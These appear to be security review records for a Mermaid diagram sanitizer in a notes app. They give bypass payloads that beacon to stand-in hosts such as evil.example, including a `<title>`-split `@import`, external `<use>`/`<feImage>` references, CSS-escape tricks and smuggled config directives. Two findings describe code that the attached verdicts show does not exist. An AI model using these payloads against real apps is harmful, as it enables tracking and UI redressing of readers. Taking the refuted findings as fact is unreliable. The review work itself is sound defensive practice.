samples.summary: CSS guard reads `textContent`, but the browser builds the stylesheet from *child text content* — an element child inside an SVG-namespace `<style>` splits `@import`/`url(` past the check
samples.evidence: `isSafeCss(el.textContent ?? '')` (mermaid.ts:286, via CSS_EXTERNAL_RE at :238) inspects the concatenation of ALL descendant text. The CSS engine, per the HTML spec's "update a style block" algorithm, uses only the element's *child text content* (direct Text-node children), skipping element subtrees. The two differ exactly when the `<style>` has an element child, and this pipeline manufactures that case: mermaid builds its stylesheet with `document.createElement('style')` (HTML namespace, RAWTEXT — `<title>` there stays text), then hands us the diagram as a serialized STRING (`mermaid.render` -> `{ svg }`, consumed at mermaid.ts:418). DOMPurify re-parses that string, where the same `<style>` is now a child of `<svg>` and therefore parsed as MARKUP, so `<title>` becomes a real SVG element that DOMPurify keeps (valid SVG tag, valid namespace). Attack: get note-controlled text into mermaid's `<style>` block (mermaid's `createCssStyles` emits `classDef`-derived rules into it) spelled `@imp<title>x</title>ort "https://evil/x.css";`. Sanitizer sees textContent `@impxort "https://evil/x.css";` — no `@import`, no `url(` — keeps the style; the live DOM's child text content is `@import "https://evil/x.css";`, a document-scoped external stylesheet load in every reader's session (IP/UA beacon + full-page restyle), which is precisely the threat the guard is documented to stop. The same split defeats the `url(` rule. Note this also falsifies the doc claim at mermaid.ts:34-37 that there is "no re-serialize/re-parse step" — DOMPurify's output is not re-serialized, but the ENGINE's is, and that is where the namespace flip happens. Mitigation: iterate direct Text children (or drop any `<style>` that has element children at all).

samples.summary: `ALLOWED_URI_REGEXP` permits `https://`, so `<use>`/`<feImage>` external references survive the anti-beacon `FORBID_TAGS` list; the comment claiming `use` is `#`-only is wrong
samples.evidence: ADD_TAGS allows `use` (mermaid.ts:217) with the justification that "`use` is still held to `ALLOWED_URI_REGEXP` below, i.e. same-document `#` references only" — but that regexp (mermaid.ts:229) is `/^(?:#|https?:\/\/|mailto:)/i`, which accepts absolute http(s). `<use xlink:href="https://evil.example/x.svg#a">` therefore passes the sanitizer. Same gap via the enabled `svgFilters` profile: `<feImage href="https://evil.example/beacon"/>` referenced from a permitted `<style>` rule `filter:url(#f)` (the `url(#` form is explicitly exempted at mermaid.ts:239) is an external fetch that the `FORBID_TAGS: ['img','image',...]` beacon defense at mermaid.ts:225 was added to prevent. Current browsers largely refuse cross-origin `use`/`feImage` references, which is why I rate this minor rather than major, but the code's own stated invariant does not hold. Fix: restrict href/xlink:href on `use`/`feImage` to `^#` (a DOMPurify `uponSanitizeAttribute` hook, or forbid `feimage`).

samples.summary: Only fetch-capable CSS is rejected; arbitrary non-fetching note-derived CSS may still reach a document-scoped `<style>`
samples.evidence: `CSS_EXTERNAL_RE` (mermaid.ts:238) rejects `@import`/`url()`/`image-set()`/`src()`/`cross-fade()` only, so any other declaration survives. Mermaid's `<style>` is inserted into the same document as the app (no shadow root, no scoping applied by this code), and its rules are only namespaced by mermaid's own stylis `#svgId{...}` wrapping, which a `}` inside a note-authored `classDef`/`style` declaration can break out of. A surviving rule such as `*{display:none}` or a `position:fixed` full-viewport overlay is UI-redress/clickjacking against every reader of the note — the same "restyle the whole app" outcome the comment at mermaid.ts:277-281 names as the reason the `<style>` matters. Consider scoping the inserted fragment (shadow DOM) or dropping `<style>` elements whose text is not fully `#note-mermaid-*`-prefixed rather than only fetch-filtering them.

finding.summary: `scrubCss` is bypassable with ordinary CSS escapes and non-`url()` fetch functions, and the sanitizer keeps `<style>` elements even though an inline-SVG `<style>` is document-scoped, so surviving note-derived CSS restyles the whole app
finding.evidence: `scrubCss` (lines 192-196) enforces its guarantees with two regexes over raw text: `/@import[^;}]*;?/gi` and `/url\(\s*(['"]?)(?!#)[^)]*\1\s*\)/gi`. Both match literal spellings only, while CSS lets identifiers and function names be escaped: `\40 import "https://evil.example/x.css";` is a valid `@import` that the first regex never sees, and `\75 rl(https://evil.example/beacon)` is a valid `url()` the second never sees. Even without escapes, `image-set("https://evil.example/x 1x")` and `src("https://evil.example/x")` fetch external resources with no `url(` token at all. Because a `<style>` element inside inline SVG is NOT scoped to the SVG — it applies to the whole document — any CSS that survives this pass is document-wide CSS authored by whoever wrote the note. Consequences short of script execution: full external `@import` of attacker CSS, exfiltration/beaconing (attribute-selector oracles, `content: url()`), and UI redressing/clickjacking of the surrounding app chrome (`position:fixed` overlays, `display:none` on controls) in every reader's session, including anonymous viewer-role share-link visitors. There is no CSP in the repo (grep for `Content-Security-Policy` / `helmet` finds only vendored node_modules and a dictionary word) to backstop either the inline `<style>` or the outbound fetches. The comment on line 191 and the design doc (`docs/design/notes/notes.md`) present this scrub as layer 3 of the security posture, which overstates it. Safer: drop `<style>` elements outright in `sanitizeSvgMarkup` (mermaid's palette can be supplied as presentation attributes / app CSS), or at minimum parse the CSS rather than regex it.

verdict.reason: The finding describes a function `scrubCss` at packages/notes/src/view/mermaid.ts:192-196 built from two literal-only regexes (`/@import[^;}]*;?/gi`, `/url\(\s*(['\"]?)(?!#)[^)]*\1\s*\)/gi`). No such function exists anywhere in the repo (repo-wide grep for `scrubCss` outside node_modules returns nothing); lines 190-205 are `stripConfigDirectives`, an unrelated fence-body config stripper. The actual CSS guard is `isSafeCss` (mermaid.ts:261-265), which tests `CSS_EXTERNAL_RE` against BOTH the raw text and `decodeCssEscapes(css)` (mermaid.ts:248-259), so the finding's two named escape payloads (`\40 import`, `\75 rl(`) decode to `@import`/`url(` and are caught. `CSS_EXTERNAL_RE` (mermaid.ts:238-239) already includes `image-set(`, `image(`, `src(` and `cross-fade(`, the exact non-`url()` fetch functions the finding says are missed. The claim that `<style>` elements are kept is inverted for the offending case: mermaid.ts:285-287 removes the whole `<style>` element when `isSafeCss` fails, and 288-290 strips offending `style` attributes. Regression tests pin these precise payloads at packages/notes/src/view/preview.test.ts:428-443 (asserting `querySelector('style')` is null and the style attribute is removed), with the unescaped variants at 366-387 and legitimate `url(#...)` preserved at 397-412. The claimed exfiltration/@import chain therefore does not complete; the residual document-scope observation is hardening, not the claimed vulnerability.

finding.summary: `stripConfigDirectives` recognizes a narrower set of config carriers than mermaid does (closing `}%%` required, unquoted `config:` key only), and the `secure` pin only covers top-level keys, so nested note-supplied config can still reach the engine
finding.evidence:
Three gaps in the layer-2/layer-1 pairing: (1) `DIRECTIVE_RE = /%%\{[\s\S]*?\}%%/g` (line 153) requires a terminating `}%%`, while mermaid's own directive detection treats the closing `}%%` as OPTIONAL (its `detectDirective` regex ends in `(?:}%{2})?`), so an unterminated `%%{init: {"flowchart": {"htmlLabels": true}}` is ignored by the strip but still parsed as a directive by the engine. (2) The front-matter guard `/^\s*config\s*:/m` (line 165) only matches an unquoted key; YAML accepts `"config":`, so `---
"config":
  themeCSS: ...
---` is left in the fence body. (3) `secure: SECURE_KEYS` (line 327) is mermaid's key-deletion list applied to the TOP LEVEL of a directive object only — `htmlLabels`, `fontFamily` and `look` live in reality under per-diagram sections (`flowchart.htmlLabels`, `sequence.*`), so listing them at top level (lines 147-149) does not pin them; a directive that slips past (1) or (2) can still flip `htmlLabels` on, widening what note text reaches the DOM as markup and feeding the mXSS surface in the finding above. Additionally, `SECURE_KEYS` deliberately REPLACES mermaid's default list, so any key mermaid adds to its defaults in a future minor version is silently unpinned here. Confidence is low because `mermaid` is not installed in this checkout (`node_modules/mermaid` absent) so I could not execute the engine to confirm the optional-terminator behaviour or the nesting of the `secure` deletion; the two regex narrowings (1) and (2) are verifiable by inspection of the patterns alone.

verdict.reason: The two regex narrowings the finding rests on do not exist in this tree; the quoted code matches a superseded version of the file. (1) The finding quotes DIRECTIVE_RE at line 153 as a lazy pattern requiring a closing brace-percent terminator. The actual constant at mermaid.ts:186-187 is mermaid's verbatim directiveRegex whose terminator is ALREADY optional, ending in (?:}%{2})? with a body alternative of (?:(?!}%{2}).|newline)*. The comment at mermaid.ts:181-184 names the optional terminator as the explicit reason for copying it verbatim. preview.test.ts:454-459 feeds the exact unterminated %%{init directive payload the reviewer describes and asserts themeCSS is stripped. (2) The finding quotes a front-matter guard matching an unquoted config key at line 165. No such guard exists anywhere in the repo; a grep for that pattern returns no source hits. stripConfigDirectives at mermaid.ts:203-204 removes front matter UNCONDITIONALLY via FRONTMATTER_RE at mermaid.ts:188, and the comment at mermaid.ts:196-201 states the reason is precisely that YAML can spell the key as a quoted or explicit key. preview.test.ts:462-472 uses the reviewer's exact quoted-config front-matter payload and asserts it is dropped. (3) The top-level-only nature of secure (mermaid.ts:391, key list 158-175) is accurate, but it is documented at mermaid.ts:29-31 and 191-194 as the very reason the carriers are stripped, and the finding's exploit chain is explicitly conditioned on a directive that slips past (1) or (2). With both absent, no note-supplied carrier reaches the engine, so there is no nested override to pin. The residual "a future mermaid minor may add a default key" point is a maintenance/hardening nit (the list at 159-164 deliberately mirrors mermaid's defaults), not an exploitable weakness. mermaid.render is called from exactly one site (mermaid.ts:418), always through stripConfigDirectives, so there is no unstripped path.
